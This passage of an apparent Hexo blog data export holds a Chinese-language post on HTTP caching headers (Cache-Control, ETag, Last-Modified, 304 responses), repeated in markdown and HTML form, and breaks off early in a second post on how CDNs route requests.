Last-Modified：标示这个响应资源的最后修改时间。web服务器在响应请求时，告诉客户端资源的最后修改时间。\n*   If-Modified-Since：当资源过期时（使用Cache-Control标识的max-age），发现资源具有Last-Modified声明，则再次向web服务器请求时带上头 If-Modified-Since，表示请求时间。web服务器收到请求后发现有头If-Modified-Since 则与被请求资源的最后修改时间进行比对。若最后修改时间较新，说明资源被改动过，则响应整片资源内容（写在响应消息包体内），则响应HTTP 200；若最后修改时间较旧，说明资源无新修改，则响应HTTP 304 (无需包体，节省流量)，告知浏览器继续使用所保存的cache。\n\n\n## 3、其他\n\n![HTTP 缓存示意图](http://owl6flhin.bkt.clouddn.com/555379-20160404211645125-1662003962.png)\n\n### 新鲜度\n\n> 理论上来讲，当一个资源被缓存存储后，该资源应该可以被永久存储在缓存中。由于缓存只有有限的空间用于存储资源副本，所以缓存会定期地将一些副本删除，这个过程叫做缓存驱逐。另一方面，当服务器上面的资源进行了更新，那么缓存中的对应资源也应该被更新，由于HTTP是C/S模式的协议，服务器更新一个资源时，不可能直接通知客户端及其缓存，所以双方必须为该资源约定一个过期时间，在该过期时间之前，该资源（缓存副本）就是新鲜的，当过了过期时间后，该资源（缓存副本）则变为陈旧的。驱逐算法用于将陈旧的资源（缓存副本）替换为新鲜的，注意，一个陈旧的资源（缓存副本）是不会直接被清除或忽略的，当客户端发起一个请求时，缓存检索到已有一个对应的陈旧资源（缓存副本），则缓存会先将此请求附加一个If-None-Match头，然后发给目标服务器，以此来检查该资源副本是否是依然还是算新鲜的，若服务器返回了 304 (Not Modified)（该响应不会有带有实体信息），则表示此资源副本是新鲜的，这样一来，可以节省一些带宽。若服务器通过 If-None-Match 或 If-Modified-Since判断后发现已过期，那么会带有该资源的实体内容返回。\n\n![HTTP 新鲜度示意图](https://mdn.mozillademos.org/files/13771/HTTPStaleness.png)\n\n> 对于含有特定头信息的请求，会去计算缓存寿命。比如Cache-control: max-age=N的请求头，相应的缓存的寿命就是N。通常情况下，对于不含这个属性的请求则会去查看是否包含Expires属性，通过比较Expires的值和头里面Date属性的值来判断是否缓存还有效。如果max-age和expires属性都没有，找找头里的Last-Modified信息。如果有，缓存的寿命就等于头里面Date的值减去Last-Modified的值除以10（注：根据rfc2626其实也就是乘以10%）\n\n### 资源加速\n> 不频繁更新的文件会使用特定的命名方式：在URL后面（通常是文件名后面）会加上版本号。加上版本号后的资源就被视作一个完全新的独立的资源，同时拥有一年甚至更长的缓存过期时长。但是这么做也存在一个弊端，所有引用这个资源的地方都需要更新链接。web开发者们通常会采用自动化构建工具在实际工作中完成这些琐碎的工作。当低频更新的资源（js/css）变动了，只用在高频变动的资源文件（html）里做入口的改动。\n\n> 这种方法还有一个好处：同时更新两个缓存资源不会造成部分缓存先更新而引起新旧文件内容不一致。对于互相有依赖关系的css和js文件，避免这种不一致性是非常重要的。\n\n### 浏览器缓存\n\n* `200 ok ` : 从原始服务器请求成功\n* `200 ok from cache` : 从缓存中获取，未向服务器验证新鲜度\n    * `200 ok from disk cache` : 从磁盘中获取（已缓存到磁盘中，如CSS样式等）\n    * `200 ok from memory cache` : 从内存中获取（已缓存到磁盘并存在内存中，如脚本、字体、图片等）\n* `304 not modified` ：向服务器发送请求，验证新鲜度，足够新鲜，服务器会返回 304状态\n\n### 页面刷新\n*   当 F5 刷新页面时，跳过强缓存功能，检查协商缓存（与在地址栏中输入url的作用一样）\n*   当 Ctrl + F5 刷新页面时，跳过强缓存和协商缓存 （直接从服务器中加载）","slug":"HTTP/HTTP 缓存","published":1,"updated":"2021-04-30T07:17:49.980Z","_id":"cko3zh966000qmi6rep5te2cs","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"HTTP-缓存\"><a href=\"#HTTP-缓存\" class=\"headerlink\" title=\"HTTP 缓存\"></a>HTTP 缓存</h1><h2 id=\"1、强缓存\"><a href=\"#1、强缓存\" class=\"headerlink\" title=\"1、强缓存\"></a>1、强缓存</h2><p>说明：强缓存直接从浏览器缓存中获取，不发送请求到服务器<br>使用：用<code>Cache-Control</code>、 <code>Expires</code> 头信息</p>\n<h3 id=\"1-1-强缓存相关头信息\"><a href=\"#1-1-强缓存相关头信息\" class=\"headerlink\" title=\"1.1 强缓存相关头信息\"></a>1.1 强缓存相关头信息</h3><ul>\n<li><code>Cache-Control</code>: HTTP/1.1 标准， 使用相对时间（从生成文档开始计时，<strong>推荐使用</strong>，优先级高于 <code>Expires</code>）</li>\n<li><code>Expires</code>：HTTP/1.0 标准，使用绝对时间（依赖计算器本地时间，可能不准确）</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; Request Header </span><br><span class=\"line\">If-None-Match: &quot;2a043f-6741-5456e5e0050c3&quot; </span><br><span class=\"line\">If-Modified-Since: Fri, 06 Jan 2017 15:06:49 GMT</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; Response Header </span><br><span class=\"line\">Cache-Control: max-age&#x3D;2592000 </span><br><span class=\"line\">Expires: Sat, 18 Feb 2017 08:31:00 GMT </span><br><span class=\"line\">ETag: &quot;2a043f-6741-5456e5e0050c3&quot;</span><br><span class=\"line\">Last-Modified: Fri, 06 Jan 2017 15:06:49 GMT</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"1-2-Cache-Control-头信息字段\"><a href=\"#1-2-Cache-Control-头信息字段\" class=\"headerlink\" title=\"1.2 Cache-Control 头信息字段\"></a>1.2 Cache-Control 头信息字段</h3><table>\n<thead>\n<tr>\n<th align=\"center\">Cache-directive</th>\n<th align=\"center\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">private</td>\n<td align=\"center\"><strong>私有缓存</strong>，即内容只缓存到私有缓存中(仅客户端可以缓存，代理服务器不可缓存)，默认为 private</td>\n</tr>\n<tr>\n<td align=\"center\">public</td>\n<td align=\"center\"><strong>公有缓存</strong>，即所有内容都将被缓存(客户端和代理服务器都可缓存)</td>\n</tr>\n<tr>\n<td align=\"center\">no-store</td>\n<td align=\"center\"><strong>禁止进行缓存</strong>，即所有内容都不会被缓存到缓存或 Internet 临时文件中</td>\n</tr>\n<tr>\n<td align=\"center\">no-cache</td>\n<td align=\"center\"><strong>强制确认缓存</strong>，即必须先与服务器确认返回的响应是否被更改（该请求应该会带有与本地缓存相关的验证字段），然后才能使用该响应来满足后续对同一个网址的请求。因此，如果存在合适的验证令牌 (ETag)，no-cache 会发起往返通信来验证缓存的响应，如果资源未被更改，可以避免下载。</td>\n</tr>\n<tr>\n<td align=\"center\">must-revalidation/proxy-revalidation</td>\n<td align=\"center\"><strong>过期校验缓存</strong>，即超过设定的过期时间后会重新检验新鲜度，通常与 <em>max-age</em> 配合使用，如果缓存的内容失效，请求必须发送到服务器/代理以进行重新验证</td>\n</tr>\n<tr>\n<td align=\"center\">immutable</td>\n<td align=\"center\"><strong>不可变的缓存</strong>，即表示该资源是不可变的（如资源名称加了指纹信息，md5 戳等），不用重新验证新鲜度，所以不必向服务器发送请求，直接从缓存中获取，也可设置 max-age 为过期时间</td>\n</tr>\n<tr>\n<td align=\"center\">max-age=xxx</td>\n<td align=\"center\">缓存的内容将在 xxx 秒后失效, 这个选项只在 HTTP 1.1可用, 并如果和 Last-Modified 一起使用时, 优先级较高</td>\n</tr>\n<tr>\n<td align=\"center\">stale-while-revalidate</td>\n<td align=\"center\">提供的是一个宽限期（由 max-age=xxx ），当检查新版本时，允许浏览器在这段宽限期期间使用过期的（旧的）资源</td>\n</tr>\n<tr>\n<td align=\"center\">stale-if-error</td>\n<td align=\"center\">如果重新验证资源时返回了 5xx 之类的错误，stale-if-error 会给浏览器一个使用旧的响应的宽限期</td>\n</tr>\n</tbody></table>\n<blockquote>\n<p><strong>Clear-Site-Data</strong>：实验性质的响应头，表示清除当前请求网站有关的浏览器数据（cookie，存储，缓存），可选值为 <code>cache</code>、<code>cookies</code>、<code>storage</code> 或 <code>*</code>，如登出时可设置响应头为 <code>Clear-Site-Data: &quot;cache&quot;, &quot;cookies&quot;, &quot;storage&quot;</code></p>\n</blockquote>\n<blockquote>\n<p>通常情况下，因为访问页面的 url 不能改变，所以不对 html 文件作缓存处理，可设置 <code>Cache-Control: max-age=0</code>，对于 js、css 等经常改变且含指纹信息的资源，可设置 <code>Cache-Control: public, max-age=31536000000</code></p>\n</blockquote>\n<h3 id=\"1-3-缓存校验\"><a href=\"#1-3-缓存校验\" class=\"headerlink\" title=\"1.3 缓存校验\"></a>1.3 缓存校验</h3><blockquote>\n<p>用户点击刷新按钮时会开始缓存验证。如果缓存的响应头信息里含有 “Cache-control: must-revalidate” 的定义，在浏览的过程中也会触发缓存验证。另外，在浏览器偏好设置里设置Advanced-&gt;Cache为强制验证缓存也能达到相同的效果。当缓存的文档过期后，需要进行缓存验证或者重新获取资源。只有在服务器返回强校验器或者弱校验器时才会进行验证。</p>\n</blockquote>\n<blockquote>\n<p>作为缓存的一种强校验器，ETag 响应头是一个对用户代理(User Agent, 下面简称UA)不透明（译者注：UA 无需理解，只需要按规定使用即可）的值。对于像浏览器这样的HTTP UA，不知道ETag代表什么，不能预测它的值是多少。如果资源请求的响应头里含有ETag, 客户端可以在后续的请求的头中带上 If-None-Match 头来验证缓存。<br/><br>Last-Modified 响应头可以作为一种弱校验器。说它弱是因为它只能精确到一秒。如果响应头里含有这个信息，客户端可以在后续的请求中带上 If-Modified-Since 来验证缓存。</p>\n</blockquote>\n<h2 id=\"2、协商缓存\"><a href=\"#2、协商缓存\" class=\"headerlink\" title=\"2、协商缓存\"></a>2、协商缓存</h2><p>说明：先发送请求给服务器，如果命中缓存，则从浏览器缓存中获取<br>使用：用 <code>Last-Modificd</code> 和 <code>If-Modificd-Since</code>、<code>Etag</code> 和 <code>If-None-Match</code> 头信息</p>\n<ul>\n<li>分布式系统里多台机器间文件的 last-modified 必须保持一致，以免负载均衡到不同机器导致比对失败</li>\n<li>分布式系统尽量关闭掉 Etag (每台机器生成的 <code>Etag</code> 都会不一样)</li>\n</ul>\n<p>Etag: 实体标签（版本标识符），用于表示文档的版本号、序列号、内容校验或指纹信息，表明文档是否被修改</p>\n<p>Last-Modified 标注的最后修改只能精确到秒级，如果某些文件在1秒钟以内，被修改多次的话，它将不能准确标注文件的修改时间，如果某些文件会被定期生成，当有时内容并没有任何变化，但 Last-Modified 却改变了，导致文件没法使用缓存，有可能存在服务器没有准确获取文件修改时间，或者与代理服务器时间不一致等情形。</p>\n<h3 id=\"Etag、If-None-Match\"><a href=\"#Etag、If-None-Match\" class=\"headerlink\" title=\"Etag、If-None-Match\"></a><code>Etag</code>、<code>If-None-Match</code></h3><ul>\n<li>  Etag：web 服务器响应请求时，告诉浏览器当前资源在服务器的唯一标识（生成规则由服务器觉得）。Apache中，ETag的值，默认是对文件的索引节（INode），大小（Size）和最后修改时间（MTime）进行Hash后得到的。</li>\n<li>  If-None-Match：当资源过期时（使用Cache-Control标识的max-age），发现资源具有Etage声明，则再次向web服务器请求时带上头If-None-Match （Etag的值）。web服务器收到请求后发现有头If-None-Match 则与被请求资源的相应校验串进行比对，决定返回200或304。</li>\n</ul>\n<h3 id=\"Last-Modified、If-Modified-Since\"><a href=\"#Last-Modified、If-Modified-Since\" class=\"headerlink\" title=\"Last-Modified、If-Modified-Since\"></a><code>Last-Modified</code>、<code>If-Modified-Since</code></h3><ul>\n<li>  Last-Modified：标示这个响应资源的最后修改时间。web服务器在响应请求时，告诉客户端资源的最后修改时间。</li>\n<li>  If-Modified-Since：当资源过期时（使用Cache-Control标识的max-age），发现资源具有Last-Modified声明，则再次向web服务器请求时带上头 If-Modified-Since，表示请求时间。web服务器收到请求后发现有头If-Modified-Since 则与被请求资源的最后修改时间进行比对。若最后修改时间较新，说明资源被改动过，则响应整片资源内容（写在响应消息包体内），则响应HTTP 200；若最后修改时间较旧，说明资源无新修改，则响应HTTP 304 (无需包体，节省流量)，告知浏览器继续使用所保存的cache。</li>\n</ul>\n<h2 id=\"3、其他\"><a href=\"#3、其他\" class=\"headerlink\" title=\"3、其他\"></a>3、其他</h2><p><img src=\"http://owl6flhin.bkt.clouddn.com/555379-20160404211645125-1662003962.png\" alt=\"HTTP 缓存示意图\"></p>\n<h3 id=\"新鲜度\"><a href=\"#新鲜度\" class=\"headerlink\" title=\"新鲜度\"></a>新鲜度</h3><blockquote>\n<p>理论上来讲，当一个资源被缓存存储后，该资源应该可以被永久存储在缓存中。由于缓存只有有限的空间用于存储资源副本，所以缓存会定期地将一些副本删除，这个过程叫做缓存驱逐。另一方面，当服务器上面的资源进行了更新，那么缓存中的对应资源也应该被更新，由于HTTP是C/S模式的协议，服务器更新一个资源时，不可能直接通知客户端及其缓存，所以双方必须为该资源约定一个过期时间，在该过期时间之前，该资源（缓存副本）就是新鲜的，当过了过期时间后，该资源（缓存副本）则变为陈旧的。驱逐算法用于将陈旧的资源（缓存副本）替换为新鲜的，注意，一个陈旧的资源（缓存副本）是不会直接被清除或忽略的，当客户端发起一个请求时，缓存检索到已有一个对应的陈旧资源（缓存副本），则缓存会先将此请求附加一个If-None-Match头，然后发给目标服务器，以此来检查该资源副本是否是依然还是算新鲜的，若服务器返回了 304 (Not Modified)（该响应不会有带有实体信息），则表示此资源副本是新鲜的，这样一来，可以节省一些带宽。若服务器通过 If-None-Match 或 If-Modified-Since判断后发现已过期，那么会带有该资源的实体内容返回。</p>\n</blockquote>\n<p><img src=\"https://mdn.mozillademos.org/files/13771/HTTPStaleness.png\" alt=\"HTTP 新鲜度示意图\"></p>\n<blockquote>\n<p>对于含有特定头信息的请求，会去计算缓存寿命。比如Cache-control: max-age=N的请求头，相应的缓存的寿命就是N。通常情况下，对于不含这个属性的请求则会去查看是否包含Expires属性，通过比较Expires的值和头里面Date属性的值来判断是否缓存还有效。如果max-age和expires属性都没有，找找头里的Last-Modified信息。如果有，缓存的寿命就等于头里面Date的值减去Last-Modified的值除以10（注：根据rfc2626其实也就是乘以10%）</p>\n</blockquote>\n<h3 id=\"资源加速\"><a href=\"#资源加速\" class=\"headerlink\" title=\"资源加速\"></a>资源加速</h3><blockquote>\n<p>不频繁更新的文件会使用特定的命名方式：在URL后面（通常是文件名后面）会加上版本号。加上版本号后的资源就被视作一个完全新的独立的资源，同时拥有一年甚至更长的缓存过期时长。但是这么做也存在一个弊端，所有引用这个资源的地方都需要更新链接。web开发者们通常会采用自动化构建工具在实际工作中完成这些琐碎的工作。当低频更新的资源（js/css）变动了，只用在高频变动的资源文件（html）里做入口的改动。</p>\n</blockquote>\n<blockquote>\n<p>这种方法还有一个好处：同时更新两个缓存资源不会造成部分缓存先更新而引起新旧文件内容不一致。对于互相有依赖关系的css和js文件，避免这种不一致性是非常重要的。</p>\n</blockquote>\n<h3 id=\"浏览器缓存\"><a href=\"#浏览器缓存\" class=\"headerlink\" title=\"浏览器缓存\"></a>浏览器缓存</h3><ul>\n<li><code>200 ok </code> : 从原始服务器请求成功</li>\n<li><code>200 ok from cache</code> : 从缓存中获取，未向服务器验证新鲜度<ul>\n<li><code>200 ok from disk cache</code> : 从磁盘中获取（已缓存到磁盘中，如CSS样式等）</li>\n<li><code>200 ok from memory cache</code> : 从内存中获取（已缓存到磁盘并存在内存中，如脚本、字体、图片等）</li>\n</ul>\n</li>\n<li><code>304 not modified</code> ：向服务器发送请求，验证新鲜度，足够新鲜，服务器会返回 304状态</li>\n</ul>\n<h3 id=\"页面刷新\"><a href=\"#页面刷新\" class=\"headerlink\" title=\"页面刷新\"></a>页面刷新</h3><ul>\n<li>  当 F5 刷新页面时，跳过强缓存功能，检查协商缓存（与在地址栏中输入url的作用一样）</li>\n<li>  当 Ctrl + F5 刷新页面时，跳过强缓存和协商缓存 （直接从服务器中加载）</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"HTTP-缓存\"><a href=\"#HTTP-缓存\" class=\"headerlink\" title=\"HTTP 缓存\"></a>HTTP 缓存</h1><h2 id=\"1、强缓存\"><a href=\"#1、强缓存\" class=\"headerlink\" title=\"1、强缓存\"></a>1、强缓存</h2><p>说明：强缓存直接从浏览器缓存中获取，不发送请求到服务器<br>使用：用<code>Cache-Control</code>、 <code>Expires</code> 头信息</p>\n<h3 id=\"1-1-强缓存相关头信息\"><a href=\"#1-1-强缓存相关头信息\" class=\"headerlink\" title=\"1.1 强缓存相关头信息\"></a>1.1 强缓存相关头信息</h3><ul>\n<li><code>Cache-Control</code>: HTTP/1.1 标准， 使用相对时间（从生成文档开始计时，<strong>推荐使用</strong>，优先级高于 <code>Expires</code>）</li>\n<li><code>Expires</code>：HTTP/1.0 标准，使用绝对时间（依赖计算器本地时间，可能不准确）</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; Request Header </span><br><span class=\"line\">If-None-Match: &quot;2a043f-6741-5456e5e0050c3&quot; </span><br><span class=\"line\">If-Modified-Since: Fri, 06 Jan 2017 15:06:49 GMT</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F; Response Header </span><br><span class=\"line\">Cache-Control: max-age&#x3D;2592000 </span><br><span class=\"line\">Expires: Sat, 18 Feb 2017 08:31:00 GMT </span><br><span class=\"line\">ETag: &quot;2a043f-6741-5456e5e0050c3&quot;</span><br><span class=\"line\">Last-Modified: Fri, 06 Jan 2017 15:06:49 GMT</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"1-2-Cache-Control-头信息字段\"><a href=\"#1-2-Cache-Control-头信息字段\" class=\"headerlink\" title=\"1.2 Cache-Control 头信息字段\"></a>1.2 Cache-Control 头信息字段</h3><table>\n<thead>\n<tr>\n<th align=\"center\">Cache-directive</th>\n<th align=\"center\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">private</td>\n<td align=\"center\"><strong>私有缓存</strong>，即内容只缓存到私有缓存中(仅客户端可以缓存，代理服务器不可缓存)，默认为 private</td>\n</tr>\n<tr>\n<td align=\"center\">public</td>\n<td align=\"center\"><strong>公有缓存</strong>，即所有内容都将被缓存(客户端和代理服务器都可缓存)</td>\n</tr>\n<tr>\n<td align=\"center\">no-store</td>\n<td align=\"center\"><strong>禁止进行缓存</strong>，即所有内容都不会被缓存到缓存或 Internet 临时文件中</td>\n</tr>\n<tr>\n<td align=\"center\">no-cache</td>\n<td align=\"center\"><strong>强制确认缓存</strong>，即必须先与服务器确认返回的响应是否被更改（该请求应该会带有与本地缓存相关的验证字段），然后才能使用该响应来满足后续对同一个网址的请求。因此，如果存在合适的验证令牌 (ETag)，no-cache 会发起往返通信来验证缓存的响应，如果资源未被更改，可以避免下载。</td>\n</tr>\n<tr>\n<td align=\"center\">must-revalidation/proxy-revalidation</td>\n<td align=\"center\"><strong>过期校验缓存</strong>，即超过设定的过期时间后会重新检验新鲜度，通常与 <em>max-age</em> 配合使用，如果缓存的内容失效，请求必须发送到服务器/代理以进行重新验证</td>\n</tr>\n<tr>\n<td align=\"center\">immutable</td>\n<td align=\"center\"><strong>不可变的缓存</strong>，即表示该资源是不可变的（如资源名称加了指纹信息，md5 戳等），不用重新验证新鲜度，所以不必向服务器发送请求，直接从缓存中获取，也可设置 max-age 为过期时间</td>\n</tr>\n<tr>\n<td align=\"center\">max-age=xxx</td>\n<td align=\"center\">缓存的内容将在 xxx 秒后失效, 这个选项只在 HTTP 1.1可用, 并如果和 Last-Modified 一起使用时, 优先级较高</td>\n</tr>\n<tr>\n<td align=\"center\">stale-while-revalidate</td>\n<td align=\"center\">提供的是一个宽限期（由 max-age=xxx ），当检查新版本时，允许浏览器在这段宽限期期间使用过期的（旧的）资源</td>\n</tr>\n<tr>\n<td align=\"center\">stale-if-error</td>\n<td align=\"center\">如果重新验证资源时返回了 5xx 之类的错误，stale-if-error 会给浏览器一个使用旧的响应的宽限期</td>\n</tr>\n</tbody></table>\n<blockquote>\n<p><strong>Clear-Site-Data</strong>：实验性质的响应头，表示清除当前请求网站有关的浏览器数据（cookie，存储，缓存），可选值为 <code>cache</code>、<code>cookies</code>、<code>storage</code> 或 <code>*</code>，如登出时可设置响应头为 <code>Clear-Site-Data: &quot;cache&quot;, &quot;cookies&quot;, &quot;storage&quot;</code></p>\n</blockquote>\n<blockquote>\n<p>通常情况下，因为访问页面的 url 不能改变，所以不对 html 文件作缓存处理，可设置 <code>Cache-Control: max-age=0</code>，对于 js、css 等经常改变且含指纹信息的资源，可设置 <code>Cache-Control: public, max-age=31536000000</code></p>\n</blockquote>\n<h3 id=\"1-3-缓存校验\"><a href=\"#1-3-缓存校验\" class=\"headerlink\" title=\"1.3 缓存校验\"></a>1.3 缓存校验</h3><blockquote>\n<p>用户点击刷新按钮时会开始缓存验证。如果缓存的响应头信息里含有 “Cache-control: must-revalidate” 的定义，在浏览的过程中也会触发缓存验证。另外，在浏览器偏好设置里设置Advanced-&gt;Cache为强制验证缓存也能达到相同的效果。当缓存的文档过期后，需要进行缓存验证或者重新获取资源。只有在服务器返回强校验器或者弱校验器时才会进行验证。</p>\n</blockquote>\n<blockquote>\n<p>作为缓存的一种强校验器，ETag 响应头是一个对用户代理(User Agent, 下面简称UA)不透明（译者注：UA 无需理解，只需要按规定使用即可）的值。对于像浏览器这样的HTTP UA，不知道ETag代表什么，不能预测它的值是多少。如果资源请求的响应头里含有ETag, 客户端可以在后续的请求的头中带上 If-None-Match 头来验证缓存。<br/><br>Last-Modified 响应头可以作为一种弱校验器。说它弱是因为它只能精确到一秒。如果响应头里含有这个信息，客户端可以在后续的请求中带上 If-Modified-Since 来验证缓存。</p>\n</blockquote>\n<h2 id=\"2、协商缓存\"><a href=\"#2、协商缓存\" class=\"headerlink\" title=\"2、协商缓存\"></a>2、协商缓存</h2><p>说明：先发送请求给服务器，如果命中缓存，则从浏览器缓存中获取<br>使用：用 <code>Last-Modificd</code> 和 <code>If-Modificd-Since</code>、<code>Etag</code> 和 <code>If-None-Match</code> 头信息</p>\n<ul>\n<li>分布式系统里多台机器间文件的 last-modified 必须保持一致，以免负载均衡到不同机器导致比对失败</li>\n<li>分布式系统尽量关闭掉 Etag (每台机器生成的 <code>Etag</code> 都会不一样)</li>\n</ul>\n<p>Etag: 实体标签（版本标识符），用于表示文档的版本号、序列号、内容校验或指纹信息，表明文档是否被修改</p>\n<p>Last-Modified 标注的最后修改只能精确到秒级，如果某些文件在1秒钟以内，被修改多次的话，它将不能准确标注文件的修改时间，如果某些文件会被定期生成，当有时内容并没有任何变化，但 Last-Modified 却改变了，导致文件没法使用缓存，有可能存在服务器没有准确获取文件修改时间，或者与代理服务器时间不一致等情形。</p>\n<h3 id=\"Etag、If-None-Match\"><a href=\"#Etag、If-None-Match\" class=\"headerlink\" title=\"Etag、If-None-Match\"></a><code>Etag</code>、<code>If-None-Match</code></h3><ul>\n<li>  Etag：web 服务器响应请求时，告诉浏览器当前资源在服务器的唯一标识（生成规则由服务器觉得）。Apache中，ETag的值，默认是对文件的索引节（INode），大小（Size）和最后修改时间（MTime）进行Hash后得到的。</li>\n<li>  If-None-Match：当资源过期时（使用Cache-Control标识的max-age），发现资源具有Etage声明，则再次向web服务器请求时带上头If-None-Match （Etag的值）。web服务器收到请求后发现有头If-None-Match 则与被请求资源的相应校验串进行比对，决定返回200或304。</li>\n</ul>\n<h3 id=\"Last-Modified、If-Modified-Since\"><a href=\"#Last-Modified、If-Modified-Since\" class=\"headerlink\" title=\"Last-Modified、If-Modified-Since\"></a><code>Last-Modified</code>、<code>If-Modified-Since</code></h3><ul>\n<li>  Last-Modified：标示这个响应资源的最后修改时间。web服务器在响应请求时，告诉客户端资源的最后修改时间。</li>\n<li>  If-Modified-Since：当资源过期时（使用Cache-Control标识的max-age），发现资源具有Last-Modified声明，则再次向web服务器请求时带上头 If-Modified-Since，表示请求时间。web服务器收到请求后发现有头If-Modified-Since 则与被请求资源的最后修改时间进行比对。若最后修改时间较新，说明资源被改动过，则响应整片资源内容（写在响应消息包体内），则响应HTTP 200；若最后修改时间较旧，说明资源无新修改，则响应HTTP 304 (无需包体，节省流量)，告知浏览器继续使用所保存的cache。</li>\n</ul>\n<h2 id=\"3、其他\"><a href=\"#3、其他\" class=\"headerlink\" title=\"3、其他\"></a>3、其他</h2><p><img src=\"http://owl6flhin.bkt.clouddn.com/555379-20160404211645125-1662003962.png\" alt=\"HTTP 缓存示意图\"></p>\n<h3 id=\"新鲜度\"><a href=\"#新鲜度\" class=\"headerlink\" title=\"新鲜度\"></a>新鲜度</h3><blockquote>\n<p>理论上来讲，当一个资源被缓存存储后，该资源应该可以被永久存储在缓存中。由于缓存只有有限的空间用于存储资源副本，所以缓存会定期地将一些副本删除，这个过程叫做缓存驱逐。另一方面，当服务器上面的资源进行了更新，那么缓存中的对应资源也应该被更新，由于HTTP是C/S模式的协议，服务器更新一个资源时，不可能直接通知客户端及其缓存，所以双方必须为该资源约定一个过期时间，在该过期时间之前，该资源（缓存副本）就是新鲜的，当过了过期时间后，该资源（缓存副本）则变为陈旧的。驱逐算法用于将陈旧的资源（缓存副本）替换为新鲜的，注意，一个陈旧的资源（缓存副本）是不会直接被清除或忽略的，当客户端发起一个请求时，缓存检索到已有一个对应的陈旧资源（缓存副本），则缓存会先将此请求附加一个If-None-Match头，然后发给目标服务器，以此来检查该资源副本是否是依然还是算新鲜的，若服务器返回了 304 (Not Modified)（该响应不会有带有实体信息），则表示此资源副本是新鲜的，这样一来，可以节省一些带宽。若服务器通过 If-None-Match 或 If-Modified-Since判断后发现已过期，那么会带有该资源的实体内容返回。</p>\n</blockquote>\n<p><img src=\"https://mdn.mozillademos.org/files/13771/HTTPStaleness.png\" alt=\"HTTP 新鲜度示意图\"></p>\n<blockquote>\n<p>对于含有特定头信息的请求，会去计算缓存寿命。比如Cache-control: max-age=N的请求头，相应的缓存的寿命就是N。通常情况下，对于不含这个属性的请求则会去查看是否包含Expires属性，通过比较Expires的值和头里面Date属性的值来判断是否缓存还有效。如果max-age和expires属性都没有，找找头里的Last-Modified信息。如果有，缓存的寿命就等于头里面Date的值减去Last-Modified的值除以10（注：根据rfc2626其实也就是乘以10%）</p>\n</blockquote>\n<h3 id=\"资源加速\"><a href=\"#资源加速\" class=\"headerlink\" title=\"资源加速\"></a>资源加速</h3><blockquote>\n<p>不频繁更新的文件会使用特定的命名方式：在URL后面（通常是文件名后面）会加上版本号。加上版本号后的资源就被视作一个完全新的独立的资源，同时拥有一年甚至更长的缓存过期时长。但是这么做也存在一个弊端，所有引用这个资源的地方都需要更新链接。web开发者们通常会采用自动化构建工具在实际工作中完成这些琐碎的工作。当低频更新的资源（js/css）变动了，只用在高频变动的资源文件（html）里做入口的改动。</p>\n</blockquote>\n<blockquote>\n<p>这种方法还有一个好处：同时更新两个缓存资源不会造成部分缓存先更新而引起新旧文件内容不一致。对于互相有依赖关系的css和js文件，避免这种不一致性是非常重要的。</p>\n</blockquote>\n<h3 id=\"浏览器缓存\"><a href=\"#浏览器缓存\" class=\"headerlink\" title=\"浏览器缓存\"></a>浏览器缓存</h3><ul>\n<li><code>200 ok </code> : 从原始服务器请求成功</li>\n<li><code>200 ok from cache</code> : 从缓存中获取，未向服务器验证新鲜度<ul>\n<li><code>200 ok from disk cache</code> : 从磁盘中获取（已缓存到磁盘中，如CSS样式等）</li>\n<li><code>200 ok from memory cache</code> : 从内存中获取（已缓存到磁盘并存在内存中，如脚本、字体、图片等）</li>\n</ul>\n</li>\n<li><code>304 not modified</code> ：向服务器发送请求，验证新鲜度，足够新鲜，服务器会返回 304状态</li>\n</ul>\n<h3 id=\"页面刷新\"><a href=\"#页面刷新\" class=\"headerlink\" title=\"页面刷新\"></a>页面刷新</h3><ul>\n<li>  当 F5 刷新页面时，跳过强缓存功能，检查协商缓存（与在地址栏中输入url的作用一样）</li>\n<li>  当 Ctrl + F5 刷新页面时，跳过强缓存和协商缓存 （直接从服务器中加载）</li>\n</ul>\n"},{"title":"CDN","date":"2021-01-14T07:38:00.000Z","_content":"\n# CDN\n\n## 1. 基本原理\n\nCDN 是将源站内容分发至最接近用户的节点，使用户可就近取得所需内容，提高用户访问的响应速度和成功率。解决因分布、带宽、服务器性能带来的访问延迟问题，适用于站点加速、点播、直播等场景。\n\n最简单的CDN 网络由一个 DNS 服务器和几台缓存服务器组成：\n1. 当用户点击网站页面上的内容URL，经过本地 DNS 系统解析， DNS 系统会最终将域名的解析权交给CNAME指向的CDN 专用 DNS 服务器。\n2. CDN 的 DNS 服务器将CDN 的全局负载均衡设备 IP 地址返回用户。\n3. 用户向 CDN 的全局负载均衡设备发起内容 URL 访问请求。\n4. CDN 全局负载均衡设备根据用户IP地址，以及用户请求的内容URL，选择一台用户所属区域的区域负载均衡设备，告诉用户向这台设备发起请求。\n5. 区域负载均衡设备会为用户选择一台合适的缓存服务器提供服务，选择的依据包括：根据用户IP地址，判断哪一台服务器距用户最近；根据用户所请求的 URL 中携带的内容名称，判断哪一台服务器上有用户所需内容；查询各个服务器当前的负载情况，判断哪一台服务器尚有服务能力。基于以上这些条件的综合分析之后，区域负载均衡设备会向全局负载均衡设备返回一台缓存服务器的 IP 地址。\n6. 全局负载均衡设备把服务器的IP地址返回给用户。\n7. 